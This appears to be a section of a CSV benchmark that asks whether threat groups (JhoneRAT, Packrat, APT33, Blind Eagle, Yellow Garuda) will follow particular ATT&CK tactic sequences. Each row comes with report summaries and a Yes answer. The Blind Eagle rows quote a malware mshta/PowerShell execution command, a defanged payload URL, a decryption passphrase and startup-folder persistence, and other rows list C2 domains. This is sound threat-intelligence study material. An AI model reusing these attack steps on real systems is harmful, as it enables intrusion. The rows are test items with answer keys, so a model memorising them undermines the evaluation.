Defense Evasion: JhoneRAT includes techniques to avoid execution on virtual machines by checking for disk serial numbers. Additionally, the Python bytecode header is removed to hinder analysis by tools such as uncompyle6.
Discovery: JhoneRAT checks the system's keyboard layout to target specific Arabic-speaking countries, including Saudi Arabia, Iraq, Egypt, Libya, Algeria, Morocco, Tunisia, Oman, Yemen, Syria, UAE, Kuwait, Bahrain, and Lebanon.
Command and Control: JhoneRAT uses cloud services for command and control activities. It checks for new commands in tweets from the handle @jhone87438316 every 10 seconds using BeautifulSoup. Commands can be issued to specific victims based on a UID generated on each target or to all victims.
Others: The JhoneRAT campaign is focused on specific Middle Eastern and Arabic-speaking countries and leverages cloud providers for operations. The campaign started in November 2019 and is ongoing. The attackers have implemented anti-VM and anti-analysis tricks. The campaign demonstrates the importance of network-based detection complemented by system behavior analysis. The threat actors' infrastructure includes URLs hosted on Google Drive and a Twitter account. Cisco Talos Intelligence Group provides various ways to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and the Open Source Snort Subscriber Rule Set.",Yes,JhoneRAT_ Cloud based python RAT targeting Middle Eastern countries
1249,259,259-Reconnaissance-T1598-Phishing for Information,"After using fake organizations in resource development to prepare for their operations, is Packrat likely to utilize phishing campaigns during their reconnaissance phase before gaining initial access to individuals by targeting them with malware?","Reconnaissance: The CTI report describes a campaign by a threat actor named Packrat, which has systematically targeted high-profile political figures, journalists, and others in several Latin American countries, including Ecuador, Argentina, Venezuela, and Brazil. Packrat has been active since at least 2008, using malware and phishing to gather information. They have also created fake opposition groups and news organizations to distribute malware and conduct phishing attacks. The report does not conclusively attribute Packrat to a particular sponsor but assesses that state sponsorship is likely given the nature of the targets and the persistence of the campaign.","Resource Development: Packrat has maintained a persistent campaign over seven years, suggesting they have the resources to support their operations. The campaign's infrastructure includes 12 different malware command and control domains and over 30 samples of malware. Packrat's activities also involve creating and maintaining fake online organizations in Venezuela and Ecuador, which indicates a systematic approach to resource development for their operations.
Initial Access: Packrat has targeted individuals with malware and phishing attacks, often using fake organizations during this period. They have also created elaborate fake news organizations without any evidence of malware or phishing activity. The report links attacks in Ecuador in 2015 to a campaign active in Argentina in 2014, targeting individuals such as Alberto Nisman and Jorge Lanata. The attackers have used phishing domains with Ecuadorian and Venezuelan targeting that became active during this period.
Execution: Packrat has used various types of malware, primarily Commercial Off-The-Shelf (COTS) RATs such as Cybergate, Xtreme, AlienSpy, and Adzok. These malware families are known to researchers, and Packrat typically obfuscates their malware using a range of tools, including an unknown VB6 crypter, AutoIt3Wrapper, UPX, PECompact, PEtite, and Allatori Obfuscator. This layer of obfuscation means that Packrat's attacks frequently escaped detection by antivirus when the attacks were deployed.
Persistence: Packrat's use of malware suggests efforts to maintain persistence within compromised networks. The malware employed by Packrat, such as CyberGate and Xtreme RAT, includes features for persistence and monitoring, ensuring continued access to systems.
Defense Evasion: Packrat's use of obfuscation techniques and runtime packers indicates a focus on defense evasion. By wrapping their RATs in AutoIt3Wrapper and employing various obfuscators, they have managed to evade antivirus detection and maintain their operations over an extended period.
Command and Control: Packrat's command and control infrastructure has been detailed, with domains such as deyrep24.ddns.net and daynews.sytes.net being used to communicate with malware on targeted systems. The infrastructure has been hosted with various providers around Latin America and has also included servers in Europe and the US.
Others: The report discusses the challenge of attributing the Packrat campaign to a specific actor. While state sponsorship is considered likely due to the nature of the targets and the campaign's persistence, the report acknowledges that Packrat's lack of technical sophistication, such as the absence of exploits and reliance on COTS malware, does not conclusively point to a state actor. The report presents scenarios for both state sponsorship and non-state actors but ultimately does not provide sufficient data for conclusive attribution.",Yes,packrat-report
1252,259,259-Resource Development-T1585-Establish Accounts,"After performing reconnaissance by creating fake opposition groups and news organizations to distribute malware and conduct phishing attacks, is Packrat likely to create and maintain fake online organizations in Venezuela and Ecuador as part of their resource development efforts before proceeding to target individuals with phishing attacks for initial access?","Resource Development: Packrat has maintained a persistent campaign over seven years, suggesting they have the resources to support their operations. The campaign's infrastructure includes 12 different malware command and control domains and over 30 samples of malware. Packrat's activities also involve creating and maintaining fake online organizations in Venezuela and Ecuador, which indicates a systematic approach to resource development for their operations.","Reconnaissance: The CTI report describes a campaign by a threat actor named Packrat, which has systematically targeted high-profile political figures, journalists, and others in several Latin American countries, including Ecuador, Argentina, Venezuela, and Brazil. Packrat has been active since at least 2008, using malware and phishing to gather information. They have also created fake opposition groups and news organizations to distribute malware and conduct phishing attacks. The report does not conclusively attribute Packrat to a particular sponsor but assesses that state sponsorship is likely given the nature of the targets and the persistence of the campaign.
Initial Access: Packrat has targeted individuals with malware and phishing attacks, often using fake organizations during this period. They have also created elaborate fake news organizations without any evidence of malware or phishing activity. The report links attacks in Ecuador in 2015 to a campaign active in Argentina in 2014, targeting individuals such as Alberto Nisman and Jorge Lanata. The attackers have used phishing domains with Ecuadorian and Venezuelan targeting that became active during this period.
Execution: Packrat has used various types of malware, primarily Commercial Off-The-Shelf (COTS) RATs such as Cybergate, Xtreme, AlienSpy, and Adzok. These malware families are known to researchers, and Packrat typically obfuscates their malware using a range of tools, including an unknown VB6 crypter, AutoIt3Wrapper, UPX, PECompact, PEtite, and Allatori Obfuscator. This layer of obfuscation means that Packrat's attacks frequently escaped detection by antivirus when the attacks were deployed.
Persistence: Packrat's use of malware suggests efforts to maintain persistence within compromised networks. The malware employed by Packrat, such as CyberGate and Xtreme RAT, includes features for persistence and monitoring, ensuring continued access to systems.
Defense Evasion: Packrat's use of obfuscation techniques and runtime packers indicates a focus on defense evasion. By wrapping their RATs in AutoIt3Wrapper and employing various obfuscators, they have managed to evade antivirus detection and maintain their operations over an extended period.
Command and Control: Packrat's command and control infrastructure has been detailed, with domains such as deyrep24.ddns.net and daynews.sytes.net being used to communicate with malware on targeted systems. The infrastructure has been hosted with various providers around Latin America and has also included servers in Europe and the US.
Others: The report discusses the challenge of attributing the Packrat campaign to a specific actor. While state sponsorship is considered likely due to the nature of the targets and the campaign's persistence, the report acknowledges that Packrat's lack of technical sophistication, such as the absence of exploits and reliance on COTS malware, does not conclusively point to a state actor. The report presents scenarios for both state sponsorship and non-state actors but ultimately does not provide sufficient data for conclusive attribution.",Yes,packrat-report
1254,259,259-Defense Evasion-T1027-Obfuscated Files or Information,"After targeting individuals with phishing attacks and fake news organizations to gain initial access, is it likely that Packrat will use Commercial Off-The-Shelf (COTS) RATs obfuscated with tools like AutoIt3Wrapper during execution before employing runtime packers and obfuscation techniques to bypass defenses?","Defense Evasion: Packrat's use of obfuscation techniques and runtime packers indicates a focus on defense evasion. By wrapping their RATs in AutoIt3Wrapper and employing various obfuscators, they have managed to evade antivirus detection and maintain their operations over an extended period.","Reconnaissance: The CTI report describes a campaign by a threat actor named Packrat, which has systematically targeted high-profile political figures, journalists, and others in several Latin American countries, including Ecuador, Argentina, Venezuela, and Brazil. Packrat has been active since at least 2008, using malware and phishing to gather information. They have also created fake opposition groups and news organizations to distribute malware and conduct phishing attacks. The report does not conclusively attribute Packrat to a particular sponsor but assesses that state sponsorship is likely given the nature of the targets and the persistence of the campaign.
Resource Development: Packrat has maintained a persistent campaign over seven years, suggesting they have the resources to support their operations. The campaign's infrastructure includes 12 different malware command and control domains and over 30 samples of malware. Packrat's activities also involve creating and maintaining fake online organizations in Venezuela and Ecuador, which indicates a systematic approach to resource development for their operations.
Initial Access: Packrat has targeted individuals with malware and phishing attacks, often using fake organizations during this period. They have also created elaborate fake news organizations without any evidence of malware or phishing activity. The report links attacks in Ecuador in 2015 to a campaign active in Argentina in 2014, targeting individuals such as Alberto Nisman and Jorge Lanata. The attackers have used phishing domains with Ecuadorian and Venezuelan targeting that became active during this period.
Execution: Packrat has used various types of malware, primarily Commercial Off-The-Shelf (COTS) RATs such as Cybergate, Xtreme, AlienSpy, and Adzok. These malware families are known to researchers, and Packrat typically obfuscates their malware using a range of tools, including an unknown VB6 crypter, AutoIt3Wrapper, UPX, PECompact, PEtite, and Allatori Obfuscator. This layer of obfuscation means that Packrat's attacks frequently escaped detection by antivirus when the attacks were deployed.
Persistence: Packrat's use of malware suggests efforts to maintain persistence within compromised networks. The malware employed by Packrat, such as CyberGate and Xtreme RAT, includes features for persistence and monitoring, ensuring continued access to systems.
Command and Control: Packrat's command and control infrastructure has been detailed, with domains such as deyrep24.ddns.net and daynews.sytes.net being used to communicate with malware on targeted systems. The infrastructure has been hosted with various providers around Latin America and has also included servers in Europe and the US.
Others: The report discusses the challenge of attributing the Packrat campaign to a specific actor. While state sponsorship is considered likely due to the nature of the targets and the campaign's persistence, the report acknowledges that Packrat's lack of technical sophistication, such as the absence of exploits and reliance on COTS malware, does not conclusively point to a state actor. The report presents scenarios for both state sponsorship and non-state actors but ultimately does not provide sufficient data for conclusive attribution.",Yes,packrat-report
1258,26,26-Command and Control-T1573-Encrypted Channel,"After leveraging multi-layered obfuscation for defense evasion by employing cloud-hosted proxies to relay requests from infected bots to backends at shared web servers, is it likely that APT33 would operate C&C servers and use a private VPN network for Command and Control?","Command and Control: APT33 operated about a dozen live C&C servers for extremely narrow targeting, using small botnets of about a dozen bots each. They used a private VPN network to issue commands to the bots and collect data.","Initial Access: APT33 utilized spear phishing campaigns to target companies in the oil product supply chain, using the private website of a European politician to send emails to companies in the supply chain of oil products. Targets included a water facility used by the U.S. army for potable water supply at one of its military bases.
Persistence: APT33 used botnets comprising small groups of infected computers to maintain persistence within the networks of select targets. The malware used has limited capabilities, including downloading and running additional malware.
Defense Evasion: APT33 employed multiple layers of obfuscation for their C&C servers, using cloud-hosted proxies to relay requests from infected bots to backends at shared web servers hosting legitimate domains. The backends would then report bot data back to a data aggregator and bot control server with a dedicated IP address. APT33 actors accessed these aggregators via a private VPN network with frequently changed exit nodes.
Discovery: APT33 conducted reconnaissance on networks relevant to the oil industry's supply chain, including an oil exploration company, military hospitals in the Middle East, and an oil company in the U.S. They used private VPN exit nodes for this purpose.
Others: APT33 showed interest in websites related to penetration testing, vulnerabilities, cryptocurrencies, hacker blogs and forums, and recruitment in the oil and gas industry. Security recommendations include establishing a regular patching policy, improving employee awareness, applying the principle of least privilege, and installing multilayered protection systems. Indicators of compromise include several SHA256 hashes associated with the malware used by APT33.",Yes,More than a Dozen Obfuscated APT33 Botnets Used for Extreme Narrow Targeting
1261,260,260-Persistence-T1547-Boot or Logon Autostart Execution,"After utilizing an AMSI bypass in a PowerShell script to evade defenses and subsequently setting obfuscated registry values, is Blind Eagle likely to ensure persistence by placing a VBScript named Login1.vbs in the Startup folder to execute SystemLogin.bat before eventually using a PowerShell script to decrypt obfuscated registry content and establish command and control with njRAT?","Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1263,260,260-Defense Evasion-T1564-Hide Artifacts,"Is it likely that after initial access is gained via a JavaScript downloader employing ActiveXObject to execute PowerShell commands, Blind Eagle will use PowerShell scripts that incorporate obfuscation techniques for defense evasion before placing a VBScript in the Startup folder to ensure persistence through system startup execution of batch files?","Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1264,260,260-Command and Control-T1071-Application Layer Protocol,"After leveraging an obfuscated batch script in the system to execute the myScript.ps1 PowerShell script and performing actions to maintain persistence, is it likely that the final PowerShell script will lead to njRAT to establish command and control over the victim's computer?","Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1265,260,260-Execution-T1059-Command and Scripting Interpreter,"After Blind Eagle initially gains access using a JavaScript downloader hosted on Discord CDN, is it likely that the group will utilize PowerShell to load DLLs and perform AMSI bypass before achieving persistence by placing a VBScript in the Startup folder to execute a batch file upon system startup?","Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1266,260,260-Execution-T1129-Shared Modules,Does Blind Eagle's attack sequence involve the use of a JavaScript downloader employing ActiveXObject to execute PowerShell commands hosted on Discord CDNs for initial access before leveraging a VBScript in the Startup folder to execute SystemLogin.bat for persistence?,"Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1267,261,261-Initial Access-T1566-Phishing,"Before maintaining persistence by replacing the victim's default Microsoft Word template, is it likely that Yellow Garuda will gain initial access through macro-enabled template files hosted on third-party services like Dropbox or AWS?","Initial Access: Yellow Garuda has been observed using macro-enabled template files for initial access as recently as March 2022. This new tactic involves remote template injection to execute a malicious macro, a method not previously associated with this threat actor. The initial documents were hosted on third-party services like Dropbox or AWS, and phishing was likely used to coerce victims into downloading and opening the documents.","Resource Development: Yellow Garuda, also known as Charming Kitten, PHOSPHORUS, and UNC788, has been active since at least 2012. This Iran-based threat actor is known for spoofing login pages of legitimate webmail services to harvest credentials. They have also expanded their toolset to include Android malware, specifically 1PINEFLOWER, which aligns with the capabilities of data exfiltrated from mobile devices.
Persistence: Yellow Garuda's macro-enabled template files maintain persistence by replacing the victim's default Microsoft Word template. This ensures that the malicious template and macro will open whenever Microsoft Word is used by the victim.
Defense Evasion: Yellow Garuda's use of macro-enabled template files disrupts analysis efforts by staging various parts of the infection chain remotely. The template files contained RC4-encrypted strings, and the decryption key was obtained via an HTTP GET request to an Amazon S3 bucket. These steps likely thwart analysis if the password to open the document is not available or if the infrastructure hosting the decryption key is inactive.
Credential Access: Yellow Garuda has a history of extensive credential harvesting via dedicated phishing sites. They have also used a Telegram 'grabber' tool to exfiltrate information from victims' Telegram accounts, including messages, media, group memberships, and contact data. The tool requires access to the victim's active Telegram session or SMS messages for authentication.
Collection: Yellow Garuda's Telegram 'grabber' tool collects messages, media, group memberships, and contact data from victims' Telegram accounts. The exfiltrated data is stored within a SQLite database and also in JSON format. The tool also allows the threat actor to delete messages from the victim's account.
Exfiltration: The Telegram 'grabber' tool used by Yellow Garuda exfiltrates data from victims' Telegram accounts over the web. The exfiltrated data includes messages, media, group memberships, and contact data, which is stored in a SQLite database and JSON format.
Others: Yellow Garuda's OPSEC mistakes have led to the disclosure of their tools, techniques, and procedures. An open directory containing several compressed archives associated with Yellow Garuda activity was discovered, revealing a new tool used to enumerate data from targeted Telegram accounts. An alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator were also identified. The report provides insight into the threat actor's data collection objectives and internal structure, denoted by numerical call signs, and highlights the alias of an individual linked to Iran-based activity over several years.",Yes,"Old cat, new tricks, bad habits"
1268,261,261-Defense Evasion-T1027-Obfuscated Files or Information,"After maintaining persistence by replacing the victim's default Microsoft Word template with a malicious macro-enabled template file, is Yellow Garuda likely to thwart analysis efforts by remotely staging components of the infection chain using RC4-encrypted strings and retrieving the decryption key via an HTTP GET request to an Amazon S3 bucket for defense evasion?","Defense Evasion: Yellow Garuda's use of macro-enabled template files disrupts analysis efforts by staging various parts of the infection chain remotely. The template files contained RC4-encrypted strings, and the decryption key was obtained via an HTTP GET request to an Amazon S3 bucket. These steps likely thwart analysis if the password to open the document is not available or if the infrastructure hosting the decryption key is inactive.","Resource Development: Yellow Garuda, also known as Charming Kitten, PHOSPHORUS, and UNC788, has been active since at least 2012. This Iran-based threat actor is known for spoofing login pages of legitimate webmail services to harvest credentials. They have also expanded their toolset to include Android malware, specifically 1PINEFLOWER, which aligns with the capabilities of data exfiltrated from mobile devices.
Initial Access: Yellow Garuda has been observed using macro-enabled template files for initial access as recently as March 2022. This new tactic involves remote template injection to execute a malicious macro, a method not previously associated with this threat actor. The initial documents were hosted on third-party services like Dropbox or AWS, and phishing was likely used to coerce victims into downloading and opening the documents.
Persistence: Yellow Garuda's macro-enabled template files maintain persistence by replacing the victim's default Microsoft Word template. This ensures that the malicious template and macro will open whenever Microsoft Word is used by the victim.
Credential Access: Yellow Garuda has a history of extensive credential harvesting via dedicated phishing sites. They have also used a Telegram 'grabber' tool to exfiltrate information from victims' Telegram accounts, including messages, media, group memberships, and contact data. The tool requires access to the victim's active Telegram session or SMS messages for authentication.
Collection: Yellow Garuda's Telegram 'grabber' tool collects messages, media, group memberships, and contact data from victims' Telegram accounts. The exfiltrated data is stored within a SQLite database and also in JSON format. The tool also allows the threat actor to delete messages from the victim's account.
Exfiltration: The Telegram 'grabber' tool used by Yellow Garuda exfiltrates data from victims' Telegram accounts over the web. The exfiltrated data includes messages, media, group memberships, and contact data, which is stored in a SQLite database and JSON format.
Others: Yellow Garuda's OPSEC mistakes have led to the disclosure of their tools, techniques, and procedures. An open directory containing several compressed archives associated with Yellow Garuda activity was discovered, revealing a new tool used to enumerate data from targeted Telegram accounts. An alias tied to early Iran-based operations and a surveillance report likely written by a Yellow Garuda operator were also identified. The report provides insight into the threat actor's data collection objectives and internal structure, denoted by numerical call signs, and highlights the alias of an individual linked to Iran-based activity over several years.",Yes,"Old cat, new tricks, bad habits"
